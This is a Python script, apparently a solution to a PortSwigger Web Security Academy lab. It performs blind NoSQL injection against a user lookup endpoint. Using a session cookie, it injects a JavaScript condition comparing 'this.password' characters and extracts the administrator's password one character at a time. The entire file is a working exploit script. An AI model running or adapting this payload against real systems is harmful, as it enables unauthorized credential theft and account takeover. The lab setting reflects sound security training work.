import requests 
import time 
import string
import urllib.parse

base_url = 'https://0abb0098047388a68aa955b400d100dc.web-security-academy.net'
username = 'administrator'
query_string = "/user/lookup?user="
weak_user_cookie = "session=d5LZvKHi1ZkOV7yqlAXJK4qRGvFglnz5"

def enumerate_current_char(c: str, char_index: int):
    payload = generate_payload(c, char_index)
    full_url = base_url + query_string + urllib.parse.quote(payload) 
    
    headers = {
    'Cookie': weak_user_cookie
    }
    res = requests.get(full_url, headers=headers, timeout=10)
    content = res.json()
    
    return (res.status_code == 200) and ("username" in content)


def generate_payload(char: str, char_index: int):
    return f"{username}\' && this.password[{char_index}] == \'{char}\' || \'a\' == \'b"

def main():
    try:        
        continue_enumerating = True 
        password = ""
        current_char_index = 0

        while continue_enumerating:
            valid_chars = list(string.printable)
            
            for i in range(0, len(valid_chars)):
                current_char = valid_chars[i]          
                found_current_char = enumerate_current_char(current_char, current_char_index) 
                
                if found_current_char:
                    password += current_char
                    current_char_index += 1

                    print(f"[+] Found another char. the current password is: {password}")
                    break
                    
            if not found_current_char:
                continue_enumerating = False
                print(f'[...] Not found charecter for index {current_char_index}. stop enumeration...')
                break
                
            
    except Exception as e: 
        print(e)   

    if len(password) > 0:
        print(f"[+] The password for the user '{username}' is '{password}'")
    else:
        print("[-] No password found")
        
main()